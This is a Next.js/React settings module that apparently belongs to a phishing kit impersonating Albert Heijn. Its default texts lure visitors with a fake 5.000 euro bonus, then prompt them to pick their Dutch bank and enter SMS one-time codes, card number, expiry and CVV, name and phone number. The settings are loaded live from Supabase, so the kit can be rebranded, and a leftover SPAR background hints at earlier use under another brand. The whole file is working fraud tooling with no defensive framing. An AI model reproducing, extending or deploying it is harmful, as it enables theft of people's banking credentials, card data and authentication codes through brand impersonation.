"use client";

import { createContext, useContext, useEffect, useState, ReactNode } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const ALBERT_HEIJN_BG_URL = "/6d4bc8553ef96b6814a98ebe96498b34.webp";
const LEGACY_BG_URL = "/spar-bg.png";
const LEGACY_PORTAL_NAME = "Albert Heijn klantenportaal";
const LEGACY_SUPPORT_CENTER_NAME = "Albert Heijn service";
const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
const LEGACY_WIN_SUBTITLE =
  "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (!next.logo_url || next.logo_url === "/logo.png") {
    next.logo_url = ALBERT_HEIJN_LOGO_URL;
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
    next.bg_url = ALBERT_HEIJN_BG_URL;
  }

  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
    next.portal_name = "Albert Heijn klantenportaal";
  }

  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
    next.support_center_name = "Albert Heijn service";
  }

  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
    next.win_title = "Exclusieve Albert Heijn bonus";
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
    next.win_subtitle =
      "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.";
  }

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: ALBERT_HEIJN_LOGO_URL,
  bg_url: ALBERT_HEIJN_BG_URL,
  portal_name: "Albert Heijn klantenportaal",
  support_center_name: "Albert Heijn service",
  win_title: "Exclusieve Albert Heijn bonus",
  win_subtitle:
    "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.",
  win_button: "Bonus claimen",
  banken_title: "Kies je bank",
  banken_subtitle: "Selecteer je Nederlandse bank om verder te gaan.",
  banken_search_placeholder: "Zoek je bank...",
  wait_title: "Even geduld",
  wait_subtitle: "Je aanvraag wordt veilig verwerkt...",
  sms_title: "SMS-beveiligingscode",
  sms_subtitle: "Voer de {digits}-cijferige code in.",
  sms_input_label: "Eenmalige code",
  sms_button: "Bevestigen",
  sms_loading: "Verwerken...",
  card_title: "Betaalgegevens",
  card_subtitle: "Controleer en bevestig je gegevens.",
  card_owner_label: "Naam kaarthouder",
  card_number_label: "Kaartnummer",
  card_expiry_label: "Vervaldatum MM/JJ",
  card_cvv_label: "Beveiligingscode",
  card_button: "Doorgaan",
  code_title: "Welkom",
  code_subtitle: "Voer de deelnamecode in die je van {partner} hebt ontvangen om je beloning vrij te geven.",
  code_button: "Code bevestigen",
  live_support_title: "Live support",
  live_support_subtitle:
    "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
  live_support_button: "Chat openen",
  profile_title_small: "Prijsbevestiging",
  profile_title_main: "Je bonusbedrag",
  profile_subtitle: "Bevestig je gegevens voor de verdere verwerking.",
  profile_firstname_label: "Voornaam",
  profile_lastname_label: "Achternaam",
  profile_phone_label: "Mobiel nummer",
  profile_button: "Verder",
  profile_loading_text: "Verwerken...",
  site_language: "nl",
  wheel_settings: {},
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: true,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = createBrowserSupabaseClient();

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) return;
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => normalizeBranding({ ...prev, ...data }) as GlobalSettings);
      }
      setLoading(false);
    }
    
    void loadSettings();

    if (!supabase) return;

    // Supabase Realtime Subscription
    const channel = supabase
      .channel("global_settings_changes")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "global_settings" },
        (payload) => {
          console.log("Settings updated in real-time!", payload.new);
          setSettings((prev) =>
            normalizeBranding({ ...prev, ...(payload.new as Partial<GlobalSettings>) }) as GlobalSettings,
          );
        }
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [supabase]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    if (!loading && settings.bg_url) {
      document.documentElement.style.setProperty('--custom-bg', `url("${settings.bg_url}")`);
    }
  }, [settings.bg_url, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
